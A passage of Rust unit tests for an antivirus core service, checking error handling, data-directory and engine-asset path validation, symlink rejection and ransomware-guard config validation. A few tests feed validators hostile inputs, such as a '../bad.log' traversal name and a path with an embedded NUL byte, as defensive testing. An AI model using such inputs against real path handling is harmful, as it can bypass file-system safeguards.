        assert!(main_source.contains("migrate_from_legacy_brand().context"));
        assert!(main_source.contains("migration::zentor_data_dir().context"));
        assert!(main_source
            .contains("write_migration_event_log(&migration_event_dir, &migration_report)"));
        assert!(!main_source.contains("if let Ok(report)"));
        assert!(!main_source.contains(&swallowed_event_pattern));
    }

    #[test]
    fn core_fatal_error_logging_reports_secondary_failures() {
        let source = include_str!("main.rs");
        let service_start = source.find("fn windows_service_main").unwrap();
        let service_end = source.find("fn run_windows_service_loop").unwrap();
        let service_source = &source[service_start..service_end];
        let old_create = [
            "let _ = std::fs::create_",
            "dir_all(avorax_program_data_dir()",
        ]
        .concat();
        let old_write = ["let _ = std::fs::", "write("].concat();
        let old_fatal_direct_write = ["std::fs::", "write(&path, detail)"].concat();

        assert!(source.contains("fn report_core_fatal_error"));
        assert!(source.contains("fn write_core_fatal_error_log"));
        assert!(source.contains("failed to create core fatal log directory"));
        assert!(source.contains("failed to write core fatal error log"));
        assert!(source.contains("temporary core fatal error log"));
        assert!(source.contains("failed to activate core fatal error log"));
        assert!(source.contains("write_runtime_file_exclusive"));
        assert!(source.contains("remove_existing_runtime_file(&path, \"core fatal error log\")"));
        assert!(source.contains(
            "cleanup_staged_local_core_file(&temp_path, \"temporary core fatal error log\")"
        ));
        assert!(!source.contains(&old_fatal_direct_write));
        assert!(service_source.contains("report_core_fatal_error(\"core_service_error.log\""));
        assert!(!service_source.contains(&old_create));
        assert!(!service_source.contains(&old_write));
        assert!(write_core_fatal_error_log("../bad.log", "blocked").is_err());
    }

    #[test]
    fn core_service_startup_does_not_suppress_native_warmup_errors() {
        let source = include_str!("main.rs");
        let loop_start = source.find("fn run_windows_service_loop").unwrap();
        let loop_end = source.find("fn handle(").unwrap();
        let loop_source = &source[loop_start..loop_end];
        let old_warmup_pattern = ["let _ = native_", "engine();"].concat();
        let old_shutdown_pattern = ["let _ = shutdown_", "rx.recv();"].concat();
        let old_shutdown_signal = ["let _ = shutdown_", "tx.send(())"].concat();

        assert!(loop_source.contains("native_engine().context(\"native engine warmup failed\")?"));
        assert!(loop_source
            .contains(".context(\"core service shutdown channel closed before stop signal\")?"));
        assert!(loop_source.contains("failed to signal core service shutdown"));
        assert!(!loop_source.contains(&old_warmup_pattern));
        assert!(!loop_source.contains(&old_shutdown_pattern));
        assert!(!loop_source.contains(&old_shutdown_signal));
    }

    #[test]
    fn core_service_status_queries_scm_api_and_preserves_errors() {
        let source = include_str!("main.rs");
        let start = source.find("fn core_service_system_status").unwrap();
        let end = source.find("fn should_surface_native_verdict").unwrap();
        let status_source = &source[start..end];

        assert!(status_source
            .contains("windows_tools::query_windows_service_status(\"avorax_core_service\")"));
        assert!(status_source.contains("WindowsServiceStatus::Missing"));
        assert!(status_source.contains("WindowsServiceStatus::Running"));
        assert!(status_source.contains("WindowsServiceStatus::Stopped"));
        assert!(status_source.contains("WindowsServiceStatus::Installed"));
        assert!(status_source.contains("CoreServiceStatusReport::status(\"missing\")"));
        assert!(status_source.contains("CoreServiceStatusReport::unknown"));
        assert!(status_source.contains("failed to query Avorax Core Service"));
    }

    #[test]
    fn core_service_status_does_not_parse_localized_command_output() {
        let source = include_str!("main.rs");
        let start = source.find("fn core_service_system_status").unwrap();
        let end = source.find("fn should_surface_native_verdict").unwrap();
        let status_source = &source[start..end];

        assert!(!status_source.contains("sc.exe"));
        assert!(!status_source.contains("Command::new"));
        assert!(!status_source.contains("output.stdout"));
        assert!(!status_source.contains("output.stderr"));
        assert!(!status_source.contains("String::from_utf8_lossy"));
        assert!(!status_source.contains("DOES NOT EXIST AS AN INSTALLED SERVICE"));
    }

    #[test]
    fn local_core_program_data_root_rejects_relative_override() {
        let _lock = env_lock();
        let previous = std::env::var_os("AVORAX_DATA_DIR");
        std::env::set_var("AVORAX_DATA_DIR", "relative-runtime");

        let error = avorax_program_data_dir().unwrap_err().to_string();

        match previous {
            Some(value) => std::env::set_var("AVORAX_DATA_DIR", value),
            None => std::env::remove_var("AVORAX_DATA_DIR"),
        }
        assert!(error.contains("AVORAX_DATA_DIR must be an absolute local path"));
    }

    #[test]
    fn local_core_program_data_root_rejects_parent_traversal_override() {
        let _lock = env_lock();
        let previous = std::env::var_os("AVORAX_DATA_DIR");
        let dir = tempdir().unwrap();
        std::env::set_var("AVORAX_DATA_DIR", dir.path().join(".."));

        let error = avorax_program_data_dir().unwrap_err().to_string();

        match previous {
            Some(value) => std::env::set_var("AVORAX_DATA_DIR", value),
            None => std::env::remove_var("AVORAX_DATA_DIR"),
        }
        assert!(error.contains("AVORAX_DATA_DIR must not contain parent traversal"));
    }

    #[test]
    fn local_core_program_data_root_has_no_relative_fallback() {
        let source = include_str!("main.rs");
        let start = source.find("fn avorax_program_data_dir_report").unwrap();
        let end = source.find("struct CoreServiceStatusReport").unwrap();
        let root_source = &source[start..end];

        assert!(root_source.contains("fn avorax_program_data_dir() -> anyhow::Result<PathBuf>"));
        assert!(root_source.contains("local_core_absolute_env_path(\"AVORAX_DATA_DIR\")?"));
        assert!(root_source.contains("validate_local_core_env_root_text(name, &text)?"));
        assert!(root_source.contains("fn validate_local_core_env_root_text"));
        assert!(root_source.contains("fn local_core_env_root_has_parent_traversal"));
        assert!(root_source.contains("{name} must not contain parent traversal"));
        assert!(root_source.contains("local_core_runtime_root_is_allowed(&path)"));
        assert!(root_source.contains("local-core ProgramData root is unavailable"));
        assert!(!root_source.contains("PathBuf::from(\".avorax\")"));
        assert!(!root_source.contains("std::env::var(\"AVORAX_DATA_DIR\")"));
    }

    fn env_lock() -> std::sync::MutexGuard<'static, ()> {
        crate::test_env_lock()
    }

    #[test]
    fn engine_asset_locator_prefers_explicit_installed_engine_dir() {
        let _guard = env_lock();
        let previous_engine_dir = std::env::var_os("AVORAX_ENGINE_DIR");
        let previous_engine_root = std::env::var_os("AVORAX_ENGINE_ROOT");
        let dir = tempdir().unwrap();
        let engine_dir = dir.path().join("engine");
        fs::create_dir_all(engine_dir.join("signatures")).unwrap();
        fs::create_dir_all(engine_dir.join("rules")).unwrap();
        fs::create_dir_all(engine_dir.join("ml")).unwrap();
        fs::create_dir_all(engine_dir.join("trust")).unwrap();
        fs::create_dir_all(engine_dir.join("config")).unwrap();

        std::env::set_var("AVORAX_ENGINE_DIR", &engine_dir);
        std::env::remove_var("AVORAX_ENGINE_ROOT");

        let locator = EngineAssetLocator::discover().unwrap();

        match previous_engine_dir {
            Some(value) => std::env::set_var("AVORAX_ENGINE_DIR", value),
            None => std::env::remove_var("AVORAX_ENGINE_DIR"),
        }
        match previous_engine_root {
            Some(value) => std::env::set_var("AVORAX_ENGINE_ROOT", value),
            None => std::env::remove_var("AVORAX_ENGINE_ROOT"),
        }
        let expected_root = dir.path().canonicalize().unwrap();
        let expected_engine_dir = engine_dir.canonicalize().unwrap();
        assert_eq!(locator.asset_root, expected_root);
        assert_eq!(locator.installed_engine_dir, expected_engine_dir);
        assert_eq!(
            locator.signatures_dir,
            locator.installed_engine_dir.join("signatures")
        );
        assert!(locator
            .paths_checked
            .iter()
            .any(|path| path == &locator.asset_root));
    }

    #[test]
    fn engine_asset_locator_rejects_relative_engine_root_override() {
        let _guard = env_lock();
        let previous_engine_dir = std::env::var_os("AVORAX_ENGINE_DIR");
        let previous_engine_root = std::env::var_os("AVORAX_ENGINE_ROOT");

        std::env::remove_var("AVORAX_ENGINE_DIR");
        std::env::set_var("AVORAX_ENGINE_ROOT", "relative-engine-root");

        let result = EngineAssetLocator::discover();

        match previous_engine_dir {
            Some(value) => std::env::set_var("AVORAX_ENGINE_DIR", value),
            None => std::env::remove_var("AVORAX_ENGINE_DIR"),
        }
        match previous_engine_root {
            Some(value) => std::env::set_var("AVORAX_ENGINE_ROOT", value),
            None => std::env::remove_var("AVORAX_ENGINE_ROOT"),
        }

        let error = result.unwrap_err().to_string();
        assert!(error.contains("AVORAX_ENGINE_ROOT"));
        assert!(error.contains("absolute local path"));
    }

    #[test]
    fn engine_asset_marker_dir_accepts_regular_directory() {
        let dir = tempdir().unwrap();

        assert!(engine_asset_marker_dir_is_regular(dir.path()).unwrap());
    }

    #[cfg(unix)]
    #[test]
    fn engine_asset_marker_dir_rejects_symbolic_link() {
        use std::os::unix::fs as unix_fs;

        let dir = tempdir().unwrap();
        let target = dir.path().join("target-engine");
        let link = dir.path().join("engine");
        fs::create_dir_all(&target).unwrap();
        unix_fs::symlink(&target, &link).unwrap();

        assert!(!engine_asset_marker_dir_is_regular(&link).unwrap());
    }

    #[test]
    fn engine_asset_locator_marker_checks_are_non_following() {
        let source = include_str!("main.rs");
        let installed_marker_probe = ["normalized.join(\"engine\")", ".is_dir()"].concat();
        let debug_marker_probe = [
            "normalized.join(\"assets\").join(\"zentor_native\")",
            ".is_dir()",
        ]
        .concat();

        assert!(
            source.contains("engine_asset_marker_dir_is_regular(&normalized.join(\"engine\"))?")
        );
        assert!(source.contains("std::fs::symlink_metadata(path)"));
        assert!(source.contains("engine_asset_metadata_is_windows_reparse_point"));
        assert!(!source.contains(&installed_marker_probe));
        assert!(!source.contains(&debug_marker_probe));
    }

    #[test]
    fn engine_asset_marker_inspection_errors_are_not_false_defaults() {
        let source = include_str!("main.rs");
        let marker_start = source
            .find("fn engine_asset_marker_dir_is_regular")
            .unwrap();
        let marker_end = source
            .find("fn engine_asset_metadata_is_windows_reparse_point")
            .unwrap();
        let marker_source = &source[marker_start..marker_end];
        let locator_start = source.find("impl EngineAssetLocator").unwrap();
        let locator_end = source.find("fn engine_dir_parent_or_self").unwrap();
        let locator_source = &source[locator_start..locator_end];

        assert!(marker_source.contains(
            "fn engine_asset_marker_dir_is_regular(path: &Path) -> anyhow::Result<bool>"
        ));
        assert!(marker_source.contains("error.kind() == io::ErrorKind::NotFound"));
        assert!(marker_source.contains("failed to inspect native engine asset marker"));
        assert!(!marker_source.contains("Err(_) => false"));
        assert!(locator_source
            .contains("engine_asset_marker_dir_is_regular(&normalized.join(\"engine\"))?"));
    }

    #[test]
    fn engine_asset_locator_uses_controlled_roots() {
        let source = include_str!("main.rs");
        let locator_start = source.find("impl EngineAssetLocator").unwrap();
        let locator_end = source
            .find("fn engine_asset_marker_dir_is_regular")
            .unwrap();
        let locator_source = &source[locator_start..locator_end];
        let health_start = source.find("fn health_response").unwrap();
        let health_end = source.find("fn display_file_name").unwrap();
        let health_source = &source[health_start..health_end];
        let old_current_dir_fallback = [
            "local-core native asset discovery failed",
            " to read current directory",
        ]
        .concat();
        let old_debug_ancestor_push = ["candidates.extend", "(current.ancestors()"].concat();
        let old_hardcoded_program_files =
            ["PathBuf::from(r\"C:\\", "Program Files\\Avorax\")"].concat();

        assert!(locator_source.contains("fn discover() -> anyhow::Result<Self>"));
        assert!(locator_source.contains("absolute_engine_asset_env_path(\"AVORAX_ENGINE_DIR\")?"));
        assert!(locator_source.contains("absolute_engine_asset_env_path(\"AVORAX_ENGINE_ROOT\")?"));
        assert!(locator_source.contains("failed to resolve current executable"));
        assert!(locator_source.contains("push_executable_engine_asset_roots"));
        assert!(locator_source.contains("#[cfg(debug_assertions)]"));
        assert!(locator_source.contains("is_native_engine_development_root(root)?"));
        assert!(locator_source.contains(".join(\"core\")"));
        assert!(locator_source.contains(".join(\"zentor_native_engine\")"));
        assert!(
            locator_source.contains("local-core native asset discovery found no controlled roots")
        );
        assert!(source.contains("let root = EngineAssetLocator::discover()?.asset_root;"));
        assert!(health_source.contains("let locator = match EngineAssetLocator::discover()"));
        assert!(health_source.contains("native_engine_unavailable_health_response"));
        assert!(health_source
            .contains("body.insert(\"native_error\".to_string(), json!(error_text.clone()))"));
        assert!(health_source.contains("\"install_path\": asset_root"));
        assert!(
            health_source.contains("\"engine_paths_checked\": locator.paths_checked")
                || health_source.contains(
                    "body.insert(\"engine_paths_checked\".to_string(), json!(paths_checked))"
                )
        );
        assert!(health_source.contains("None => Vec::new()"));
        assert!(!locator_source.contains(&old_hardcoded_program_files));
        assert!(!locator_source.contains(&old_current_dir_fallback));
        assert!(!locator_source.contains(&old_debug_ancestor_push));
        assert!(!locator_source.contains("current_dir().unwrap_or_else"));
        assert!(!locator_source.contains("PathBuf::from(\".\")"));
    }

    #[test]
    fn engine_asset_candidate_defaults_are_explicit_branches() {
        let source = include_str!("main.rs");
        let locator_start = source.find("impl EngineAssetLocator").unwrap();
        let helper_start = source.find("fn engine_dir_parent_or_self").unwrap();
        let marker_start = source
            .find("fn engine_asset_marker_dir_is_regular")
            .unwrap();
        let locator_source = &source[locator_start..helper_start];
        let helper_source = &source[helper_start..marker_start];
        let old_canonicalize_fallback = ["Err(_)", " => candidate.to_path_buf()"].concat();

        assert!(locator_source.contains("engine_dir_parent_or_self(&engine)"));
        assert!(locator_source.contains("push_engine_asset_root(&mut candidates"));
        assert!(locator_source.contains("canonicalize_engine_candidate(&candidate)?"));
        assert!(helper_source.contains("match engine.parent()"));
        assert!(helper_source.contains("Some(parent) if parent.as_os_str().is_empty()"));
        assert!(helper_source.contains("Some(parent) => parent.to_path_buf()"));
        assert!(helper_source.contains("None => engine.to_path_buf()"));
        assert!(helper_source.contains("match candidate.canonicalize()"));
        assert!(helper_source.contains("Ok(normalized) =>"));
        assert!(
            helper_source.contains("Err(error) if error.kind() == std::io::ErrorKind::NotFound")
        );
        assert!(helper_source.contains("failed to canonicalize"));
        assert!(!locator_source.contains("engine.parent().unwrap_or"));
        assert!(!locator_source.contains(".canonicalize()\n                .unwrap_or_else"));
        assert!(!helper_source.contains(&old_canonicalize_fallback));
    }

    #[test]
    fn health_response_preserves_self_test_error_context() {
        let source = include_str!("main.rs");
        let health_start = source.find("fn health_response").unwrap();
        let health_end = source.find("fn display_file_name").unwrap();
        let health_source = &source[health_start..health_end];
        let generic_native_failure = [
            "Some(format!(\"native self-test result was {}\",",
            " report.overall_result))",
        ]
        .concat();

        assert!(source.contains("\"native_self_test_error\": native_self_test_error"));
        assert!(source.contains("\"ai_self_test_error\": ai_self_test_error"));
        assert!(source.contains("let ai_self_test_result = ai::ai_self_test::run_ai_self_test();"));
        assert!(source.contains("let native_self_test_result = engine.engine_self_test();"));
        assert!(
            source.contains("native_self_test_status_and_error(native_self_test_result.as_ref())")
        );
        assert!(source.contains("native_self_test_failure_detail(report)"));
        assert!(source.contains("Err(error) => (false, Some(format!(\"{error:#}\")))"));
        assert!(source.contains("\"native_ml_status\": native_ml_status_label(&status)"));
        assert!(!health_source.contains("Err(_) => false"));
        assert!(source.contains("failed_prerequisites="));
        assert!(source.contains("signature_pack_loaded"));
        assert!(source.contains("rule_pack_loaded"));
        assert!(!source.contains("\"ai_self_test\": ai::ai_self_test::run_ai_self_test().is_ok()"));
        assert!(!health_source.contains(".unwrap_or(false)"));
        assert!(!source.contains(".engine_self_test()\n                .map(|report| report.overall_result == \"pass\")\n                .unwrap_or(false)"));
        assert!(!health_source.contains("ml_model_version.as_deref().unwrap_or_default()"));
        assert!(!source.contains(&generic_native_failure));
    }

    fn native_status_with_ml(
        loaded: bool,
        version: Option<&str>,
        production_ready: bool,
    ) -> AneEngineStatus {
        AneEngineStatus {
            native_engine_ready: true,
            signature_pack_loaded: true,
            signature_count: 1,
            rule_pack_loaded: true,
            rule_count: 1,
            ml_model_loaded: loaded,
            ml_model_version: version.map(ToString::to_string),
            ml_model_production_ready: production_ready,
            trust_store_loaded: true,
            known_good_count: 0,
            known_bad_count: 0,
            last_error: None,
            compatibility_engines_disabled_by_default: true,
            detection_providers: Vec::new(),
        }
    }

    #[test]
    fn native_ml_status_label_reports_missing_model_version_as_error() {
        let status = native_status_with_ml(true, None, true);

        assert_eq!(native_ml_status_label(&status), "error");
    }

    #[test]
    fn native_ml_status_label_uses_production_metadata_not_version_text() {
        let development = native_status_with_ml(true, Some("1.0.0"), false);
        let loaded = native_status_with_ml(true, Some("0.1.0-dev"), true);
        let missing = native_status_with_ml(false, None, false);

        assert_eq!(native_ml_status_label(&development), "developmentModel");
        assert_eq!(native_ml_status_label(&loaded), "loaded");
        assert_eq!(native_ml_status_label(&missing), "modelMissing");

        let source = include_str!("main.rs");
        let helper_start = source.find("fn native_ml_status_label").unwrap();
        let helper_end = helper_start + source[helper_start..].find("fn native_engine").unwrap();
        let helper_source = &source[helper_start..helper_end];

        assert!(helper_source.contains("!status.ml_model_production_ready"));
        assert!(!helper_source.contains("version.contains(\"dev\")"));
    }

    #[test]
    fn display_file_name_uses_leaf_or_path_fallback() {
        assert_eq!(display_file_name(Path::new("C:/Temp/tool.exe")), "tool.exe");
        assert_eq!(
            display_file_name(Path::new("/")),
            Path::new("/").display().to_string()
        );
    }

    #[test]
    fn display_file_name_fallback_branch_is_explicit() {
        let source = include_str!("main.rs");
        let helper_start = source.find("fn display_file_name").unwrap();
        let label_start = source.find("fn save_training_label").unwrap();
        let helper_source = &source[helper_start..label_start];

        assert!(helper_source.contains("fn display_file_leaf_name(path: &Path) -> Option<String>"));
        assert!(helper_source.contains("fn display_file_path_fallback(path: &Path) -> String"));
        assert!(helper_source.contains("Some(name) => name"));
        assert!(helper_source.contains("None => display_file_path_fallback(path)"));
        assert!(!helper_source.contains("unwrap_or_else(|| path.display().to_string())"));
    }

    #[test]
    fn evidence_file_names_do_not_default_to_empty_strings() {
        let source = crate::normalized_test_source(include_str!("main.rs"));
        let production_source = source
            .split_once("#[cfg(test)]")
            .map(|(production, _)| production)
            .expect("test module marker");
        let old_value_fallback = [
            ".file_name()\n            .map(|value| value.to_string_lossy().to_string())\n            .unwrap_or_default()",
        ]
        .concat();
        let old_name_fallback = [
            ".file_name()\n            .map(|name| name.to_string_lossy().to_string())\n            .unwrap_or_default()",
        ]
        .concat();

        assert_eq!(
            production_source
                .matches("file_name: display_file_name(path)")
                .count(),
            5
        );
        assert!(!production_source.contains(&old_value_fallback));
        assert!(!production_source.contains(&old_name_fallback));
    }

    #[test]
    fn native_self_test_failure_detail_names_failed_prerequisites() {
        let report = AneSelfTestReport {
            eicar_detected: true,
            signature_pack_loaded: false,
            rule_pack_loaded: false,
            ml_model_loaded: false,
            compatibility_engines_disabled_by_default: true,
            overall_result: "fail".to_string(),
        };

        let detail = native_self_test_failure_detail(&report);

        assert!(detail.contains("eicar_detected=true"));
        assert!(detail.contains("signature_pack_loaded=false"));
        assert!(detail.contains("rule_pack_loaded=false"));
        assert!(detail.contains("failed_prerequisites=signature_pack_loaded,rule_pack_loaded"));
    }

    #[test]
    fn configure_ransomware_guard_persists_protected_roots_and_trusted_processes() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        let documents = dir.path().join("Documents");
        let pictures = dir.path().join("Pictures");
        let backup_dir = dir.path().join("Backup");
        let backup_exe = backup_dir.join("backup.exe");
        fs::create_dir_all(&documents).unwrap();
        fs::create_dir_all(&pictures).unwrap();
        fs::create_dir_all(&backup_dir).unwrap();
        fs::write(&backup_exe, b"harmless backup fixture").unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "configure_ransomware_guard",
            "protected_roots": [documents, format!(" {} ", documents.display()), pictures],
            "trusted_process_allowlist": [backup_exe, ""]
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], true);
        let persisted: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(&config_path).unwrap()).unwrap();
        let expected_documents = documents.display().to_string().replace('\\', "/");
        let expected_pictures = pictures.display().to_string().replace('\\', "/");
        let expected_backup = backup_exe.display().to_string().replace('\\', "/");
        assert_eq!(
            persisted["protected_roots"],
            json!([expected_documents, expected_pictures])
        );
        assert_eq!(
            persisted["trusted_process_allowlist"],
            json!([expected_backup])
        );
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn configure_ransomware_guard_rejects_root_protected_folder() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "configure_ransomware_guard",
            "protected_roots": ["C:/"],
            "trusted_process_allowlist": []
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("protected root is too broad"));
        assert!(!config_path.exists());
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn configure_ransomware_guard_rejects_sensitive_system_roots() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "configure_ransomware_guard",
            "protected_roots": ["C:/Windows"],
            "trusted_process_allowlist": []
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("protected root is too broad"));
        assert!(!config_path.exists());
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_invalid_persisted_entries() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        fs::write(
            &config_path,
            r#"{"protected_roots":["C:/Windows"],"trusted_process_allowlist":[""],"updated_at":"2024-01-01T00:00:00Z","source":"fixture"}"#,
        )
        .unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("invalid ransomware guard config"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_unknown_persisted_fields() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        fs::write(
            &config_path,
            r#"{"protected_roots":[],"trusted_process_allowlist":[],"updated_at":"2024-01-01T00:00:00Z","source":"fixture","enabled":false}"#,
        )
        .unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("unable to parse ransomware guard config"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_persisted_nul_paths() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        let raw = serde_json::to_string(&json!({
            "protected_roots": ["C:/Users/Brent/Documents\u{0}/Hidden"],
            "trusted_process_allowlist": [],
            "updated_at": "2024-01-01T00:00:00Z",
            "source": "fixture"
        }))
        .unwrap();
        fs::write(&config_path, raw).unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"].as_str().unwrap().contains("contains NUL"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_empty_persisted_source() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        fs::write(
            &config_path,
            r#"{"protected_roots":[],"trusted_process_allowlist":[],"updated_at":"2024-01-01T00:00:00Z","source":" "}"#,
        )
        .unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("ransomware guard config source is empty"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_oversized_persisted_config_before_parse() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        fs::write(
            &config_path,
            "x".repeat(MAX_RANSOMWARE_GUARD_CONFIG_BYTES as usize + 1),
        )
        .unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("exceeds maximum size"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn list_ransomware_guard_config_rejects_directory_config_path() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        fs::create_dir(&config_path).unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("not a regular file"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[cfg(unix)]
    #[test]
    fn list_ransomware_guard_config_rejects_symbolic_link_config_path() {
        use std::os::unix::fs::symlink;

        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let target = dir.path().join("target.json");
        let config_path = dir.path().join("ransomware_guard.json");
        fs::write(
            &target,
            r#"{"protected_roots":[],"trusted_process_allowlist":[],"updated_at":"2024-01-01T00:00:00Z","source":"fixture"}"#,
        )
        .unwrap();
        symlink(&target, &config_path).unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_ransomware_guard_config"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("symbolic link"));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn ransomware_guard_config_read_path_safety_markers_stay_in_place() {
        let source = include_str!("main.rs");
        let read_start = source.find("fn read_ransomware_guard_config").unwrap();
        let path_start = source.find("fn ransomware_guard_config_path").unwrap();
        let read_source = &source[read_start..path_start];
        let presence_helper_pattern = ["config_file_", "present"].concat();
        let read_guard_pattern = ["ensure_regular_config_", "file(path, label)?"].concat();
        let metadata_helper_pattern = ["ensure_regular_config_", "metadata"].concat();
        let reparse_pattern = ["config_metadata_is_windows_", "reparse_point"].concat();
        let path_exists_pattern = ["path", ".exists()"].concat();

        assert!(read_source.contains(&presence_helper_pattern));
        assert!(source.contains(&read_guard_pattern));
        assert!(source.contains(&metadata_helper_pattern));
        assert!(source.contains(&reparse_pattern));
        assert!(!read_source.contains(&path_exists_pattern));
    }

    #[test]
    fn ransomware_guard_config_reader_is_metadata_and_actual_byte_bounded() {
        let source = include_str!("main.rs");
        let start = source.find("fn read_bounded_config_text").unwrap();
        let end = source.find("fn config_file_present").unwrap();
        let reader = &source[start..end];

        assert!(reader.contains("let metadata = ensure_regular_config_file(path, label)?"));
        assert!(reader.contains("metadata.len() > max_bytes"));
        assert!(reader.contains("let mut total = 0_u64"));
        assert!(reader.contains("checked_add(read as u64)"));
        assert!(reader.contains("total > max_bytes"));
        assert!(reader.contains("bytes.extend_from_slice(&buffer[..read])"));
        assert!(reader.contains("String::from_utf8(bytes)"));
        assert!(source.contains(
            "fn ensure_regular_config_file(path: &Path, label: &str) -> anyhow::Result<std::fs::Metadata>"
        ));
    }

    #[test]
    fn ransomware_guard_config_schema_and_value_validation_stay_strict() {
        let source = include_str!("main.rs");
        let struct_start = source
            .find("struct PersistedRansomwareGuardConfig")
            .unwrap();
        let write_start = source.find("fn write_ransomware_guard_config").unwrap();
        let validate_start = source.find("fn validate_ransomware_guard_config").unwrap();
        let writer_source = &source[write_start..validate_start];
        let validate_source =
            &source[validate_start..source.find("fn write_guard_mode_config").unwrap()];

        assert!(source[..struct_start].contains("#[serde(deny_unknown_fields)]"));
        assert!(writer_source.contains("serde_json::to_string_pretty(&config)?"));
        assert!(validate_source
            .contains("validate_persisted_ransomware_path(root, \"protected root\")?"));
        assert!(validate_source.contains(
            "validate_persisted_ransomware_path(trusted, \"trusted process allowlist entry\")?"
        ));
        assert!(validate_source.contains("validate_persisted_ransomware_source(&config.source)?"));
        assert!(validate_source.contains("value.contains('\\0')"));
    }

    #[test]
    fn start_watch_command_returns_best_effort_watcher_for_existing_paths() {
        let dir = tempdir().unwrap();
        let command = CoreCommand {
            command: "start_watch".to_string(),
            path: None,
            paths: Some(vec![
                dir.path().display().to_string(),
                dir.path().join("missing").display().to_string(),
            ]),
            action_mode: None,
            scan_kind: None,
            threat_name: None,
            engine: None,
            quarantine_id: None,
            allowlist_id: None,
            confirmed: None,
            sha256: None,
            user_label: None,
            user_note: None,
            previous_verdict: None,
            protection_mode: None,
            protected_roots: None,
            trusted_process_allowlist: None,
            ransomware_activity: None,
            process_observations: None,
